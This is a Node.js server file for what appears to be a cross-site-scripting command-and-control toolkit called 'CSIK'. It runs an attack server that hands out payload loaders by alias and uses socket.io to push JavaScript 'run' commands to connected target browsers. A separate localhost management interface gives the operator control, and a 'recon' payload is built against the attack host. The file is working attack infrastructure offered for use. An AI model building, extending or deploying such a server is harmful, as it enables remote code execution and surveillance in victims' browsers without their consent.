import express from 'express'
import http from 'http'
import socketio from 'socket.io'
import cors from 'cors'
import attackRouter from './routers/attack.mjs'
import clientRouter from './routers/client.mjs'
import * as alias from './data/alias.mjs'
import loaderController from './controllers/loader.mjs'
import { renderPayload } from './build.js'

// Attack interface
const attackApi = express()
const attackServer = http.createServer(attackApi)
const attackSocket = socketio(attackServer)
const attackPort = 3000

attackApi.use(cors())
attackApi.use(express.json())
attackApi.use('/atk', attackRouter)
attackApi.get('/:alias', (req, res) => {
  let matchingAlias = alias.get(req.params.alias)
  if (matchingAlias) {
    if (matchingAlias.type === alias.Types.LOADER) {
      req.params.loader = matchingAlias.name
      return loaderController.get(req, res)
    } else {
      res.status(500).json({ msg: 'Not yet implemented for this type' })
    }
  } else {
    res.sendStatus(404)
  }
})

attackSocket.on('connection', (socket) => {
  console.log('Target connection received')
  socket.emit('run', 'alert("xss")')
})

attackServer.listen(attackPort, () => console.log(`CSIK Server listening on port ${attackPort}!`))

// Management interface
const managementApi = express()
const managementServer = http.createServer(managementApi)
const managementSocket = socketio(managementServer)
const managementPort = 3001

managementApi.use(cors())
managementApi.use(express.json())
managementApi.use('/atk', attackRouter)
managementApi.use('/api', clientRouter)

managementSocket.on('connection', (socket) => {
  console.log('Client connected')
})

managementServer.listen(managementPort, 'localhost', () => console.log(`Management interface listening on port ${managementPort}`))

renderPayload('recon').then((payload) => { console.log('payload', payload({ HOST: 'http://localhost:3000' })) })
